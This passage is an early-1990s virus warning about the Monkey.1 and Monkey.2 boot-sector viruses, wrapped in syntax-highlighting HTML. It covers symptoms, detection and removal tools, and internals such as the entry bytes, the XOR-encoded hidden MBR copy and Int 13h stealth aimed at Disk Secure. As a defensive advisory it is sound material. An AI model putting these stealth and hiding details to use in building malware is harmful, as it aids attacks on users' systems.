</span><span class="sc5">anti</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">products</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0"> </span><span class="sc5">automated</span><span class="sc0"> </span><span class="sc5">way</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">doing</span><span class="sc0"> </span><span class="sc5">this.</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0">
</span><span class="sc5">don</span><span class="sc12">'t have a copy of the original MBR, and don'</span><span class="sc5">t</span><span class="sc0"> </span><span class="sc5">know</span><span class="sc0"> </span><span class="sc5">what</span><span class="sc0"> </span><span class="sc5">values</span><span class="sc0">
</span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">should</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">KILLMONK</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0">
</span><span class="sc5">restore</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">you.</span><span class="sc0">

</span><span class="sc5">To</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0"> </span><span class="sc5">diskettes</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Use</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">KILLMONK</span><span class="sc0"> </span><span class="sc5">program.</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">newest</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">PROT</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">version</span><span class="sc0"> </span><span class="sc2">2.04A</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">KILLMONK</span><span class="sc0">
</span><span class="sc5">program</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">both</span><span class="sc0"> </span><span class="sc5">available</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">charge</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">Computing</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">
</span><span class="sc5">Network</span><span class="sc0"> </span><span class="sc5">Services.</span><span class="sc0"> </span><span class="sc5">Bring</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">formatted</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Microcomputer</span><span class="sc0">
</span><span class="sc5">Demonstration</span><span class="sc0"> </span><span class="sc5">Centre</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">MDC</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">basement</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Bookstore</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
</span><span class="sc5">ready</span><span class="sc4">-</span><span class="sc5">made</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">purchased</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">$2.00</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CNS</span><span class="sc0"> </span><span class="sc5">User</span><span class="sc0">
</span><span class="sc5">Support</span><span class="sc0"> </span><span class="sc5">Centre</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc2">302</span><span class="sc0"> </span><span class="sc5">General</span><span class="sc0"> </span><span class="sc5">Services</span><span class="sc0"> </span><span class="sc5">Building.</span><span class="sc0"> </span><span class="sc5">These</span><span class="sc0"> </span><span class="sc5">programs</span><span class="sc0">
</span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">also</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">downloaded</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">MTS</span><span class="sc0"> </span><span class="sc5">account</span><span class="sc0"> </span><span class="sc5">VIR.</span><span class="sc0">

</span><span class="sc1">;From: martin@cs.ualberta.ca (Tim Martin; FSO; Soil Sciences)</span><span class="sc0">
</span><span class="sc5">Subject</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">WARNING</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Monkey.1</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">Monkey.2</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">PC</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Date</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0"> </span><span class="sc5">Jul</span><span class="sc0"> </span><span class="sc2">92</span><span class="sc0"> </span><span class="sc2">09</span><span class="sc4">:</span><span class="sc2">10</span><span class="sc4">:</span><span class="sc2">09</span><span class="sc0"> </span><span class="sc5">GMT</span><span class="sc0">

</span><span class="sc5">Virus</span><span class="sc0"> </span><span class="sc9">Name</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">MONKEY.1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MONKEY.2</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">Empire</span><span class="sc0"> </span><span class="sc5">variants</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">V</span><span class="sc0"> </span><span class="sc5">Status</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">New</span><span class="sc0">
</span><span class="sc5">Discovery</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">February</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1992</span><span class="sc0">
</span><span class="sc5">Symptoms</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc10">Memory</span><span class="sc0"> </span><span class="sc5">reduction</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc0"> </span><span class="sc5">partitions</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">accessible</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0">
             </span><span class="sc5">floppy</span><span class="sc0"> </span><span class="sc5">bootup.</span><span class="sc0">
</span><span class="sc5">Origin</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">Alberta</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Canada</span><span class="sc0">
</span><span class="sc5">Eff.</span><span class="sc0"> </span><span class="sc9">Length</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0">
</span><span class="sc9">Type</span><span class="sc0"> </span><span class="sc5">Code</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">BPRtS</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">Partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">infector</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Resident</span><span class="sc0"> </span><span class="sc5">TOM</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">
             </span><span class="sc5">Stealth</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Detection</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">CHKDSK</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">PROT</span><span class="sc0"> </span><span class="sc2">2.04</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CHKSEC</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0"> </span><span class="sc2">1.15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KILLMONK</span><span class="sc0">
</span><span class="sc5">Removal</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">Cold</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc4">-</span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc5">floppy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">replace</span><span class="sc0"> </span><span class="sc5">MBR</span><span class="sc0">
</span><span class="sc4">(</span><span class="sc5">hard</span><span class="sc0">
             </span><span class="sc5">disk</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc5">Sector</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">floppy</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0">

</span><span class="sc5">General</span><span class="sc0"> </span><span class="sc5">Comments</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">Main</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc9">Record</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc5">Sector</span><span class="sc0"> </span><span class="sc5">infectors</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc5">derived</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Empire</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc5">virus.</span><span class="sc0">  </span><span class="sc5">Two</span><span class="sc0"> </span><span class="sc5">variants</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">
</span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">been</span><span class="sc0"> </span><span class="sc5">identified</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">their</span><span class="sc0"> </span><span class="sc5">most</span><span class="sc0"> </span><span class="sc5">obvious</span><span class="sc0"> </span><span class="sc5">difference</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">initial</span><span class="sc0">
</span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Monkey.1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">E9</span><span class="sc0"> </span><span class="sc5">CD</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">02D0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Monkey.2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">EB</span><span class="sc0"> </span><span class="sc2">1E</span><span class="sc0"> </span><span class="sc2">90</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">0020</span><span class="sc0"> </span><span class="sc1">; NOP)</span><span class="sc0">

</span><span class="sc5">Both</span><span class="sc0"> </span><span class="sc5">variants</span><span class="sc0"> </span><span class="sc5">keep</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc13">'s data at offset 03h - 1fh.  In
</span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">sectors</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">region</span><span class="sc0"> </span><span class="sc5">contains</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc5">required</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">identify</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">diskette</span><span class="sc0"> </span><span class="sc5">format.</span><span class="sc0">  </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">solves</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">problem</span><span class="sc0"> </span><span class="sc5">noticed</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">earlier</span><span class="sc0">
</span><span class="sc5">variants</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">Empire</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">whereby</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc0"> </span><span class="sc2">720k</span><span class="sc0"> </span><span class="sc5">diskettes</span><span class="sc0"> </span><span class="sc5">were</span><span class="sc0"> </span><span class="sc5">sometimes</span><span class="sc0">
</span><span class="sc5">unreadable.</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">take</span><span class="sc0"> </span><span class="sc2">1k</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">top</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">memory.</span><span class="sc0">  </span><span class="sc5">When</span><span class="sc0"> </span><span class="sc5">active</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc0">
</span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">reduced</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc5">bytes.</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">use</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">protect</span><span class="sc0"> </span><span class="sc5">both</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">MBR</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc0">
</span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">sectors.</span><span class="sc0">  </span><span class="sc5">When</span><span class="sc0"> </span><span class="sc5">active</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc5">calls</span><span class="sc0"> </span><span class="sc5">cannot</span><span class="sc0"> </span><span class="sc5">access</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">infected</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">either</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disks</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">floppies.</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">polimorphic.</span><span class="sc0">  </span><span class="sc5">They</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">encode</span><span class="sc0"> </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">was</span><span class="sc0"> </span><span class="sc5">done</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">some</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">earlier</span><span class="sc0"> </span><span class="sc5">Empire</span><span class="sc0"> </span><span class="sc5">variants.</span><span class="sc0">  </span><span class="sc5">But</span><span class="sc0"> </span><span class="sc5">before</span><span class="sc0">
</span><span class="sc5">saving</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc0"> </span><span class="sc5">MBR</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">hiding</span><span class="sc0"> </span><span class="sc5">place</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0">
</span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc5">encode</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0"> </span><span class="sc3">"XOR 2Eh"</span><span class="sc5">.</span><span class="sc0">  </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">creates</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
</span><span class="sc5">problem</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">disinfecting</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">recover</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">initial</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0">
</span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MBR</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">copying</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hiding</span><span class="sc0"> </span><span class="sc5">place.</span><span class="sc0">

</span><span class="sc5">When</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">encoded</span><span class="sc0"> </span><span class="sc5">MBR</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">put</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">side</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc5">cylinder</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc2">3.</span><span class="sc0">

</span><span class="sc5">When</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">floppy</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">placed</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">bottom</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">root</span><span class="sc0"> </span><span class="sc5">directory.</span><span class="sc0">  </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">means</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0">
</span><span class="sc5">entries</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">lost</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">root</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">nearly</span><span class="sc0"> </span><span class="sc5">full</span><span class="sc0"> </span><span class="sc4">--</span><span class="sc0"> </span><span class="sc5">more</span><span class="sc0">
</span><span class="sc5">than</span><span class="sc0"> </span><span class="sc2">96</span><span class="sc0"> </span><span class="sc5">entries</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">double</span><span class="sc0"> </span><span class="sc5">density</span><span class="sc0"> </span><span class="sc5">diskettes</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">more</span><span class="sc0"> </span><span class="sc5">than</span><span class="sc0"> </span><span class="sc2">208</span><span class="sc0"> </span><span class="sc5">entries</span><span class="sc0">
</span><span class="sc5">on</span><span class="sc0"> </span><span class="sc9">high</span><span class="sc0"> </span><span class="sc5">density</span><span class="sc0"> </span><span class="sc5">diskettes.</span><span class="sc0">  </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">designed</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">identify</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">four</span><span class="sc0"> </span><span class="sc5">most</span><span class="sc0"> </span><span class="sc9">common</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc0"> </span><span class="sc5">formats.</span><span class="sc0">  </span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
</span><span class="sc5">recognized</span><span class="sc0"> </span><span class="sc5">format</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">put</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">side</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc2">3.</span><span class="sc0">  </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0">
</span><span class="sc5">no</span><span class="sc0"> </span><span class="sc5">idea</span><span class="sc0"> </span><span class="sc5">what</span><span class="sc0"> </span><span class="sc5">would</span><span class="sc0"> </span><span class="sc5">happen</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc2">2.88Mb</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">but</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">suspect</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">would</span><span class="sc0"> </span><span class="sc5">damage</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">File</span><span class="sc0"> </span><span class="sc5">Allocation</span><span class="sc0"> </span><span class="sc5">Table</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">causing</span><span class="sc0"> </span><span class="sc5">loss</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">data.</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">put</span><span class="sc0"> </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">messages</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">screen</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc5">but</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">does</span><span class="sc0"> </span><span class="sc5">contain</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encrypted</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0"> </span><span class="sc3">"Monkey"</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc5">followed</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc2">1992h.</span><span class="sc0">  </span><span class="sc5">It</span><span class="sc0"> </span><span class="sc5">may</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">significant</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">chinese</span><span class="sc0"> </span><span class="sc5">Year</span><span class="sc0">
</span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">began</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">February</span><span class="sc0"> </span><span class="sc2">1992.</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">most</span><span class="sc0"> </span><span class="sc5">remarkable</span><span class="sc0"> </span><span class="sc5">characteristic</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">they</span><span class="sc0">
</span><span class="sc5">were</span><span class="sc0"> </span><span class="sc5">designed</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0"> </span><span class="sc5">attack</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">Padgett</span><span class="sc0"> </span><span class="sc5">Peterson</span><span class="sc13">'s "Disk Secure"
</span><span class="sc5">product.</span><span class="sc0">  </span><span class="sc5">When</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">booted</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
